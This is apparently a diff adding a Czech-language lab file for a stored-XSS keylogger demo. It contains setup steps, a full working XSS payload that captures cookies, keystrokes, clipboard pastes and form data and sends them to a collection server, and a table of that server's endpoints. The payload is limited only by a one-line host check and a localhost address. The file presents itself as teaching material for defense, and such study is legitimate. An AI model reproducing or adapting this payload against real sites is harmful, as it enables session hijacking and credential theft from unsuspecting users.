@@ -1,0 +1,56 @@
+================================================================================
+ LAB-ONLY KEYLOGGER DEMO — NEFUNGUJE NA ŽÁDNÉM VEŘEJNÉM WEBU
+================================================================================
+
+Tento soubor je inertní ukázka pro IZOLOVANÉ LABORATORNÍ PROSTŘEDÍ.
+
+BEZPEČNOSTNÍ ZÁBRANY (nedívej se na ně jako na překážku — jsou důvod, proč
+toto může být veřejně na GitHubu):
+  1) host-guard: skript se spustí POUZE na hostiteli "lab.local".
+     "lab.local" není reálná veřejná doména — existuje jen v tvé lab síti
+     (přes /etc/hosts na 127.0.0.1). V prohlížeči návštěvníka jakéhokoli
+     jiného webu se kód NESPUSTÍ.
+  2) C2 adresa je 127.0.0.1 (localhost) — data nikam "do internetu" netečou.
+  3) Žádné cílové cesty, názvy polí ani fingerprint reálného webu.
+
+================================================================================
+ CO DEMO UKÁZUJE (vzdělávací účel)
+================================================================================
+  - jak stored XSS spustí JS při zobrazení obsahu,
+  - jak JS sbírá cookies / klávesy / paste / formuláře,
+  - jak data batchuje a odesílá na sběrný server (viz c2.py),
+  - proč CSP + HttpOnly cookies + output-escaping tento útok ZASTAVÍ
+    (viz DEFENSE.md).
+
+================================================================================
+ JAK SPUSTIT V LABU
+================================================================================
+  1) /etc/hosts (Linux/mac) nebo C:\Windows\System32\drivers\etc\hosts (Windows):
+        127.0.0.1   lab.local
+  2) Spusť mock web:  cd lab && php -S 127.0.0.1:8000
+  3) Spusť C2:        python3 c2.py      (vypíše token)
+  4) Vlož PAYLOAD níže do pole "Text" mock webu (http://lab.local:8000/).
+     POZOR: mock poslouchá na :8000, ale payload musí ukazovat na C2 :8080.
+  5) Otevři stránku s inzerátem (mode !safe) v prohlížeči → události běží na C2.
+  6) Dashboard: http://127.0.0.1:8080/?token=<TVUJ_TOKEN>
+
+================================================================================
+ PAYLOAD (vlož do pole "Text")
+================================================================================
+
+<img src=x onerror="var C=&quot;http://127.0.0.1:8080&quot;;if(location.host.indexOf(&quot;lab.local&quot;)&lt;0)return;var vid=Math.random().toString(36).slice(2,10),buf=&quot;&quot;;function g(u){new Image().src=C+u}function fl(){if(buf){g(&quot;/k?k=&quot;+encodeURIComponent(buf));buf=&quot;&quot;}}setInterval(fl,3000);document.onkeypress=function(e){buf+=e.key;if(buf.length&gt;50)fl()};document.addEventListener(&quot;paste&quot;,function(e){setTimeout(function(){try{g(&quot;/p?p=&quot;+encodeURIComponent((e.clipboardData||window.clipboardData).getData(&quot;text&quot;)))}catch(x){}},0)},true);document.addEventListener(&quot;submit&quot;,function(e){var el=e.target,d=&quot;&quot;;for(var i=0;i&lt;el.elements.length;i++){var x=el.elements[i];if(x.name&amp;&amp;x.type!=&quot;file&quot;)d+=x.name+&quot;=&quot;+encodeURIComponent(x.value||&quot;&quot;)+&quot;&amp;&quot;}g(&quot;/f?d=&quot;+encodeURIComponent(d))},true);addEventListener(&quot;visibilitychange&quot;,fl);g(&quot;/hello?vid=&quot;+vid+&quot;&amp;co=&quot;+encodeURIComponent(document.cookie)+&quot;&amp;u=&quot;+encodeURIComponent(location.href))">
+
+================================================================================
+ VÝZNAM CEST NA C2
+================================================================================
+  /hello?co=<cookie>&u=<url>   = úvodní hit (session + adresa)
+  /k?k=<dávka znaků>           = keylogger (dávkově)
+  /p?p=<text>                  = obsah schránky při vložení
+  /f?d=<form data>             = formulář při odeslání
+
+================================================================================
+ PRAVIDLA
+================================================================================
+  - NEMĚŇ host-guard na reálnou doménu. Nikdy.
+  - Tento kód je pro vlastní lab, výuku a demonstraci obrany.
+  - Detaily obrany: DEFENSE.md. Etické a právní hranice: DISCLAIMER.md.
